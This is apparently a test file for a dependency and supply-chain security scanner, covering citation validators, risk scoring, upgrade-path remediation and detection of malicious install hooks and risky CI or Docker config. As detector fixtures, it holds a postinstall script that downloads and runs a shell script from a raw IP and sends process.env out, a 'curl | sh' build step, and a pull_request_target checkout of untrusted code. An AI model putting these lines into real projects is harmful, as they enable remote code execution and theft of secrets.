"""Run: .venv/Scripts/python -m tests.test_day2   (no network, no API key needed)"""
import os
import tempfile

os.environ["GUARDIAN_DATA_DIR"] = tempfile.mkdtemp()
os.environ["GROQ_API_KEY"] = ""  # empty (not absent) so backend/.env cannot fill it: no real API calls
os.environ["GUARDIAN_LLM_API_KEY"] = ""

from semantic_version import Version  # noqa: E402

from app import llm  # noqa: E402
from app.agents import prioritize, remediate  # noqa: E402

if __name__ == "__main__":
    # Validator building blocks
    files = {"a.js": ["const x = require('bson')", "x.deserialize(buf)"]}
    assert llm.check_citations({"e": [{"file": "a.js", "line": 2, "quote": "x.deserialize"}]}, "e", files) == []
    assert llm.check_citations({"e": [{"file": "a.js", "line": 9}]}, "e", files)          # line outside file
    assert llm.check_citations({"e": [{"file": "b.js", "line": 1}]}, "e", files)          # file not shown
    assert llm.check_citations({"e": [{"file": "a.js", "line": 1, "quote": "nope"}]}, "e", files)  # bad quote
    assert llm.check_number({"n": 3}, "n", -2, 2) and not llm.check_number({"n": -2}, "n", -2, 2)
    assert llm.check_ids("see CVE-2020-7610", {"CVE-2020-7610"}) == []
    assert llm.check_ids("see CVE-1999-0001", {"CVE-2020-7610"})                         # invented id
    # No key: the pipeline still gets a clean "unavailable" result
    assert not llm.API_KEY
    r = llm.ask("t", "x@1", "s", "u", lambda a: [])
    assert not r["ok"] and "unavailable" in r["reason"]

    # Prioritize bands and reachability factor
    assert [prioritize.band(s) for s in (9.0, 7.0, 4.0, 3.9)] == ["critical", "high", "medium", "low"]
    assert prioritize.R_FACTOR == {"reachable": 1.0, "unknown": 1.0, "not_reachable": 0.7}
    # bson example: 9.8 x 1.0 x 0.8 x 1.0 x 1.0 = 7.8 -> high
    assert round(min(10, 9.8 * 1.0 * 0.8 * 1.0 * 1.0), 1) == 7.8

    # Recommend Fix: chain resolution against a fake registry
    remediate._packuments.update({
        "mongodb": {"versions": {"2.1.18": {"dependencies": {"mongodb-core": "1.3.18"}},
                                 "3.0.0": {"dependencies": {"mongodb-core": "3.0.0"}}}},
        "mongodb-core": {"versions": {"1.3.18": {"dependencies": {"bson": "~0.4.19"}},
                                      "3.0.0": {"dependencies": {"bson": "~1.0.4"}}}},
        "bson": {"versions": {"0.4.23": {}, "1.0.4": {}, "1.1.4": {}}},
    })
    t, steps = remediate.walk_chain(["mongodb", "mongodb-core", "bson"], Version("3.0.0"))
    assert str(t) == "1.0.4" and [s["package"] for s in steps] == ["mongodb", "mongodb-core", "bson"]
    t, _ = remediate.walk_chain(["mongodb", "mongodb-core", "bson"], Version("2.1.18"))
    assert str(t) == "0.4.23"
    assert remediate.jump(Version("2.1.18"), Version("3.0.0")) == "major"
    # Investigate: built-in static checks
    from app.agents.investigate import rule_verdict, static_checks
    files = {"package.json": ['{', '  "scripts": {', '    "postinstall": "node setup.js"', '  }', '}'],
             "setup.js": ["const cp = require('child_process')",
                          "https.get('http://45.9.148.3/x.sh', r => cp.exec('sh x.sh'))",
                          "send(process.env)"]}
    hits = static_checks(files, hook_lines=[3])
    rules = {h["rule"] for h in hits}
    assert {"download-and-execute", "download", "exec", "secrets", "network-target"} <= rules, rules
    assert all(h["file"] in files and h["line"] >= 1 for h in hits)
    assert rule_verdict([], hits)[0] == "risky" and rule_verdict(["MAL-2023-1"], [])[0] == "malicious"
    benign = static_checks({"package.json": ['"install": "node-gyp rebuild"']}, hook_lines=[1])
    assert rule_verdict([], benign)[0] == "unknown", benign
    # Batching: 12 items -> 3 calls; an item failing validation is retried alone in one extra call
    import json as _json
    calls = []

    def fake_chat(system, prompt):
        ids = [l.split("=", 1)[1] for l in prompt.splitlines() if l.startswith("ITEM id=")]
        calls.append(ids)
        bad = "p3" in ids and len(calls) == 1  # first answer for p3 is invalid
        return _json.dumps({"answers": [{"id": i, "v": "bad" if (bad and i == "p3") else "ok"} for i in ids]}), {}
    llm._chat, llm.API_KEY = fake_chat, "test"
    reqs = [{"subject": f"p{n}", "user": f"item {n}", "validate": lambda a: [] if a.get("v") == "ok" else ["v must be ok"]}
            for n in range(12)]
    res = llm.ask_batch("t", "sys", reqs)
    assert all(r["ok"] for r in res.values()) and len(res) == 12, res
    assert len(calls) == 4 and calls[1] == ["p3"], calls          # 3 batches + 1 retry of the failed item only
    assert res["p3"]["attempts"] == 2 and "id" not in res["p0"]["answer"]
    calls.clear()
    assert all(r.get("cached") for r in llm.ask_batch("t", "sys", reqs).values()) and calls == []  # rescan: 0 calls
    llm.API_KEY = ""

    # Prioritize: Investigate verdicts become ranked rows (no network: feeds stubbed)
    prioritize.load_kev = lambda: (set(), {"status": "ok"})
    prioritize.load_epss = lambda cves: ({}, {"status": "ok"})
    comp = lambda n, direct=True, scope="runtime": {"id": f"pkg:npm/{n}@1.0.0", "name": n, "version": "1.0.0",
                                                    "direct": direct, "scope": scope}
    comps = [comp("evil"), comp("odd"), comp("odd-dev", scope="dev"), comp("cvepkg")]
    vuln = {"component": "pkg:npm/cvepkg@1.0.0", "advisory_id": "GHSA-x", "aliases": [], "cves": [], "cvss_score": 3.0,
            "severity": "low", "title": "t", "fix": "2.0.0", "url": "u"}
    inv = lambda n, v: {"component": f"pkg:npm/{n}@1.0.0", "verdict": v, "basis": "fact"}
    _, pub = prioritize.run({"components": comps, "paths": {}, "workdir": ".", "vulnerabilities": [vuln],
                             "investigations": [inv("evil", "malicious"), inv("odd", "risky"), inv("odd-dev", "risky"),
                                                inv("cvepkg", "risky")]})
    by = {r["package"]: r for r in pub["risks"]}
    assert by["evil"]["final_score"] == 10.0 and "known malware" in by["evil"]["labels"]
    assert by["odd"]["final_score"] == 6.0 and by["odd"]["band"] == "medium" and "supply-chain risk" in by["odd"]["labels"]
    assert by["odd-dev"]["final_score"] == 3.0                                 # 6.0 x U 0.5
    assert by["cvepkg"]["final_score"] == 4.0 and "raised to 4.0" in by["cvepkg"]["formula"]   # 3.0 floored
    assert len(pub["risks"]) == 4

    # Repo config findings: built-in checks, then rows and cards
    from app.agents.investigate_config import checks
    ev = lambda text: {"file": "x.yml", "line": 3, "text": text}
    f = lambda rule, text: {"rule": rule, "evidence": ev(text), "title": "t", "rationale": "r"}
    assert checks(f("unpinned-action", "uses: actions/checkout@v4"), [])[0] == "harmless"
    assert checks(f("unpinned-action", "uses: someone/tool@main"), [])[0] == "risky"
    assert checks(f("base-image", "FROM node:20"), [])[0] == "harmless"
    assert checks(f("base-image", "FROM alpine"), [])[0] == "risky"
    assert checks(f("base-image", "FROM bob/node:20"), [])[0] == "risky"
    assert checks(f("base-image", "FROM gcr.io/distroless/nodejs24-debian13:nonroot"), [])[0] == "harmless"
    assert checks(f("build-install", "RUN curl -s https://x.sh | sh"), [])[0] == "risky"
    assert checks(f("build-install", "RUN npm install -g typescript@5"), [])[0] == "harmless"
    assert checks(f("build-install", "RUN npm install --omit=dev"), [])[0] == "risky"
    wf = ["on: pull_request_target", "steps:", "  - uses: actions/checkout@v4",
          "    with: { ref: ${{ github.event.pull_request.head.sha }} }"]
    assert checks(f("workflow-risk", "on: pull_request_target"), wf)[0] == "malicious"
    cfg = {"component": "config:x.yml:3", "verdict": "risky", "basis": "rule", "package": "x.yml:3", "rule": "base-image",
           "file": "x.yml", "line": 3, "text": "FROM alpine"}
    _, pub = prioritize.run({"components": [], "paths": {}, "workdir": ".", "vulnerabilities": [], "investigations": [cfg]})
    row = pub["risks"][0]
    assert row["final_score"] == 6.0 and "repo config" in row["labels"] and row["package"] == "x.yml:3"
    card = remediate.config_card(row, {"investigations": [cfg]})
    assert card["action"] == "config" and "digest" in card["title"] and card["score_after"] == 0.0
    # Recommend Fix: every route to the vulnerable version, OSV-vetted candidates
    edges = [{"source": "project:.", "target": "pkg:npm/jsonwebtoken@0.4.0"},
             {"source": "project:.", "target": "pkg:npm/express-jwt@0.1.3"},
             {"source": "pkg:npm/express-jwt@0.1.3", "target": "pkg:npm/jsonwebtoken@0.1.0"},
             {"source": "pkg:npm/jsonwebtoken@0.4.0", "target": "pkg:npm/jws@0.2.6"},
             {"source": "pkg:npm/jsonwebtoken@0.1.0", "target": "pkg:npm/jws@0.2.6"}]
    routes = remediate.routes_to("pkg:npm/jws@0.2.6", edges, {})
    assert sorted(r[1][0] for r in routes) == ["pkg:npm/express-jwt@0.1.3", "pkg:npm/jsonwebtoken@0.4.0"], routes
    remediate._packuments.update({"express-jwt": {"versions": {
        "0.1.3": {"dependencies": {"jsonwebtoken": "0.1.0"}}, "6.0.0": {"dependencies": {"jsonwebtoken": "^8.1.0"}},
        "7.0.0": {"dependencies": {"jsonwebtoken": "^9.0.0"}}}},
        "jsonwebtoken": {"versions": {"0.1.0": {}, "8.5.1": {}, "9.0.0": {}}}})
    remediate._osv_cache.update({("express-jwt", "6.0.0"): [], ("jsonwebtoken", "8.5.1"): ["GHSA-8cf7-32gw-wr33"],
                                 ("express-jwt", "7.0.0"): [], ("jsonwebtoken", "9.0.0"): []})
    v, t, steps, rejected = remediate.find_safe(["express-jwt", "jsonwebtoken"], Version("0.1.3"), Version("5.0.0"))
    assert str(v) == "7.0.0" and str(t) == "9.0.0", (v, t)          # 6.0.0 skipped: pulls jsonwebtoken 8.5.1 (high)
    assert rejected and rejected[0]["version"] == "6.0.0" and "GHSA-8cf7-32gw-wr33" in rejected[0]["because"][0]
    print("day2 ok")
